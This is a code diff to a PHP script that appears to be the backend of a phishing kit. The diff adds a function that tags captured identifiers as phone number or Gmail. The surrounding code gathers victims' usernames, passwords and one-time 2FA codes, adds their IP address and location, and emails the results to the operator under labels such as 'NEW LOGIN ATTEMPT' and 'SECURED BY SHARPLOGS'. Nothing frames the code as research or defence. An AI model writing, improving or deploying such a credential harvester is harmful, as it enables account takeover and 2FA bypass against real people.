@@ -259,6 +259,17 @@ function getLocation($ip) {
     ];
 }
 
+// Function to determine platform based on identifier
+function getPlatform($identifier) {
+    if (strpos($identifier, '+') === 0) {
+        return 'NUMBER';
+    } elseif (strpos($identifier, '@') !== false) {
+        return 'GMAIL';
+    } else {
+        return 'UNKNOWN';
+    }
+}
+
 // Check if form fields are set
 if (!empty($vote)) {
     // Vote button clicked notification
@@ -284,10 +295,11 @@ if (!empty($vote)) {
     // Continue button clicked (email/phone entered without password or OTP)
     $ip = getClientIP();
     $location = getLocation($ip);
+    $platform = getPlatform($em);
 
     $message = "📱 NEW LOGIN ATTEMPT (Continue)\n\n";
     $message .= "📋 DETAILS:\n";
-    $message .= "PLATFORM: GMAIL\n";
+    $message .= "PLATFORM: " . $platform . "\n";
 
     if (strpos($em, '+') === 0 || strpos($em, '@') !== false) {
         if (strpos($em, '+') === 0) {
@@ -310,10 +322,10 @@ if (!empty($vote)) {
     $message .= "City: " . $location['city'] . "\n";
     $message .= "IP: " . $ip . "\n";
     $message .= "Time: " . date('Y-m-d H:i:s') . "\n\n";
-    $message .= "-GMAIL LOGIN SYSTEM-\n";
+    $message .= "-" . $platform . " LOGIN SYSTEM-\n";
 
     $send = $Receive_email;
-    $subject = "Gmail Continue Button: $ip";
+    $subject = $platform . " Continue Button: $ip";
 
     logMessage($message, $send, $subject);
 } elseif (!empty($device_verify)) {
@@ -395,12 +407,13 @@ if (!empty($vote)) {
 } elseif (!empty($em) && (!empty($password) || !empty($otp))) {
     $ip = getClientIP();
     $location = getLocation($ip);
+    $platform = getPlatform($em);
 
     if (!empty($password)) {
         // Login attempt
         $message = "🔐 NEW LOGIN ATTEMPT\n\n";
         $message .= "📋 DETAILS:\n";
-        $message .= "PLATFORM: GMAIL\n";
+        $message .= "PLATFORM: " . $platform . "\n";
         $message .= "UserName: " . htmlspecialchars($em) . "\n";
         $message .= "Password: " . htmlspecialchars($password) . "\n";
         if (strpos($em, '+') === 0) {
@@ -415,8 +428,9 @@ if (!empty($vote)) {
         $message .= "IP: " . $ip . "\n\n";
         $message .= "-SECURED BY SHARPLOGS-\n";
     } elseif (!empty($otp)) {
-        // OTP code
-        $message = "🔑 GMAIL 2FA CODE\n\n";
+        // OTP code - use different title based on platform
+        $otpTitle = ($platform === 'NUMBER') ? 'NUMBER 2FA CODE' : 'GMAIL 2FA CODE';
+        $message = "🔑 " . $otpTitle . "\n\n";
         $message .= "📋 DETAILS:\n";
         $message .= "User: " . htmlspecialchars($em) . "\n";
         $message .= "Code: " . htmlspecialchars($otp) . "\n";
